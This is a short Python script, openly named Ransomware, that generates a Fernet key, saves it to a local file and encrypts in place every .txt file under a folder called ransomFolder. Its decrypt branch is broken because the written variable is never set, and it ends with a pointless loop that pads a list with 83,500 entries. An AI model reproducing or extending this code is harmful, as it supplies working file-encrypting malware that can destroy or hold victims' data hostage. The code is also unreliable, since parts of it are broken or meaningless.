import os
from cryptography.fernet import Fernet
import base64

class Ransomware:
	def __init__(self, key=None):
		self.key = key
		self.cryptor = None
		self.file_ext_targets = ['txt']

	def hello(self):
		print("hello Fernet")

	def generate_key(self):
		self.key = Fernet.generate_key()
		self.cryptor = Fernet(self.key)

	def read_key(self, keyfile_name):
		with open(keyfile_name, 'rb') as f:
			self.key = f.read()
			self.cryptor = Fernet(self.key)

	def write_key(self, keyfile_name):
		#print(self.key)
		with open(keyfile_name, 'wb') as f:
			f.write(self.key)

	def crypt_root(self, root_dir, encrypted=False):
		for root, _, files in os.walk(root_dir):
			for f in files:
				abs_file_path = os.path.join(root, f)

				if not abs_file_path.split('.')[-1] in self.file_ext_targets:
					continue

				self.crypt_file(abs_file_path, encrypted=encrypted)

	def crypt_file(self, file_path, encrypted=False):
		with open(file_path, 'rb+') as f:
			_data = f.read()

			if not encrypted:
				#print(f'File contents pre encryption: {_data}')
				data = self.cryptor.encrypt(_data)
				#print(f'File contents post encryption: {data}')

			f.seek(0)
			f.write(data)


if __name__ == '__main__':

	import argparse
	parser = argparse.ArgumentParser()
	parser.add_argument('--action', required=True)
	parser.add_argument('--keyfile')

	args = parser.parse_args()
	action = args.action.lower()
	keyfile = args.keyfile

	rware = Ransomware()
	#rware.hello()

	local_root = './ransomFolder'

	if action == 'encrypt':
		rware.generate_key()
		rware.write_key('keyfile')
		rware.crypt_root(local_root)

	#add to fill gaps
	gaps = 83500
	fill_list = [1,2,3,4,5,6,7,8,9,10]
	Length1 = len(fill_list)
	for i in range(0,gaps):
		fill_list.append(6)
	Length2 = len(fill_list)

